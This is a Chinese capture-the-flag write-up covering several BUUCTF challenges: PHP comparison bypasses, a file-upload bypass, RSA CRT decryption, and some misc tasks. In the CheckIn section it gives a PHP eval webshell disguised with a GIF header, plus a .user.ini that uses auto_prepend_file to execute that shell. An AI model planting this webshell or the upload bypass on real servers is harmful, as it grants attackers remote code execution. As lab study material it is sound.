# BUUCTF-.user.ini-rsa1

第七周第二次

**目录**

[TOC]





## WEB

### [MRCTF2020]Ez_bypass



<img src="https://i-blog.csdnimg.cn/blog_migrate/d10a14f0b8763e06eede55464109495a.png" alt="" style="max-height:792px; box-sizing:content-box;" />


代码审计

```cobol
1. md5强比较过滤
数组即可绕过
 
2.is_numeric() ==
1234567 a 即可绕过
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/5f8e6aa3d979cf2ab5acd1c1e032284a.png" alt="" style="max-height:243px; box-sizing:content-box;" />


### [SUCTF 2019]CheckIn

文件上传

先编写上传代码

1.jpg

```cobol
GIF89a
<script language='php'>eval($_POST['a']);</script>
```

稳定上传

成功

然后我们尝试使用

```undefined
.user.ini
```

这个比

```undefined
.htaccess
```

作用的范围更大 可以修改文件配置

给一个文件头 防止文件头审核

```cobol
GIF89a                  
auto_prepend_file=1.jpg 
auto_append_file=1.jpg  
```

然后进行上传

两个文件上传成功

开始访问



<img src="https://i-blog.csdnimg.cn/blog_migrate/b90e4b2b14dc8a80acf1a1808aa2d98a.png" alt="" style="max-height:326px; box-sizing:content-box;" />


得到上传地址 开始连接

```cobol
2d7480a8-c61e-4e5a-8053-b824ba82328e.node4.buuoj.cn:81/uploads/f9e1016a5cec370aae6a18d438dabfa5 
 
 
 
a
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/355df922a4f29f4007ccc4a97c3074fc.png" alt="" style="max-height:699px; box-sizing:content-box;" />


得到flag

## Crypto

### RSA1

```cobol
import gmpy2
 
p =8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 
q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 
dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041
dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929
c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852
n = p * q
 
I = gmpy2.invert(p, q)                      #I为p(mod q)的逆元，即p*I = 1(mod q)
mp = gmpy2.powmod(c, dp, p)                 #计算mp = c^dp % p
mq = gmpy2.powmod(c, dq, q)                 #计算mq = c^dq % q        
 
m = (mp + (I * (mq - mp)) * p) % n          #明文求解公式
m = hex(m)[2:]                              #转十六进制数据
 
flag = ''
for i in range(len(m)//2):
    flag += chr(int(m[i*2:(i+1)*2], 16))
 
print(flag)
```

### 权限获得第一步



<img src="https://i-blog.csdnimg.cn/blog_migrate/b63fda151b6f50147c6934019ec1db3f.png" alt="" style="max-height:781px; box-sizing:content-box;" />


认为是hex

MD5解密



<img src="https://i-blog.csdnimg.cn/blog_migrate/acf7f4165989cf597cc6c2a380b8331c.png" alt="" style="max-height:306px; box-sizing:content-box;" />


## Misc

### webshell后门

与后门查杀一样的



<img src="https://i-blog.csdnimg.cn/blog_migrate/6a65788fa0d54a53ed22aaa0f3d5cd6a.png" alt="" style="max-height:781px; box-sizing:content-box;" />


### 荷兰宽带数据泄露

使用工具 [RouterPassView](https://www.onlinedown.net/soft/104401.htm) 打开

```cobol
RouterPassView：路由器的备份文件通常包含了像ISP的用户名重要数据/密码、路由器的登录密码，是无线网络的关键。如果不小心失去了这些密码/钥匙，也可以通过路由器配置的备份文件找回。RouterPassView就是一个找回路由器密码的工具，可以帮助你从路由器中恢复丢失的密码。
```





<img src="https://i-blog.csdnimg.cn/blog_migrate/a9a0d12792e3c78bf455f06d9820f1e1.png" alt="" style="max-height:480px; box-sizing:content-box;" />